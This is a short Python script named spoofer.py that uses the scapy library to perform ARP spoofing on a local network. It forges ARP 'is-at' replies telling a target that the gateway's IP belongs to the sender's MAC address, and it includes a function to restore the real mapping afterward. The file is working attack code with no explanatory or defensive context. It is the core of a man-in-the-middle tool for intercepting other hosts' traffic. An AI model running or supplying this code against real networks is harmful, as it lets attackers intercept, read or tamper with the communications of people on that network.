#!/usr/bin/env python3
# spoofer.py

from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def get_mac(ip):

	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src


def spoof(target_ip, gateway, verbose=True):

	target_mac = get_mac(target_ip)
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway, op='is-at')
	send(arp_response, verbose=0)

	if verbose:
		self_mac = ARP().hwsrc
		print("Sent to {} : {} is-at {}".format(target_ip, gateway, self_mac))


def restore(target_ip, gateway, verbose=True):

	target_mac = get_mac(target_ip)
	gateway_mac = get_mac(gateway)

	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway, hwsrc=gateway_mac, op='is-at')
	send(arp_response, verbose=0, count=7)
	if verbose:
		print("Sent to {} : {} is-at {}".format(target_ip, gateway, gateway_mac))
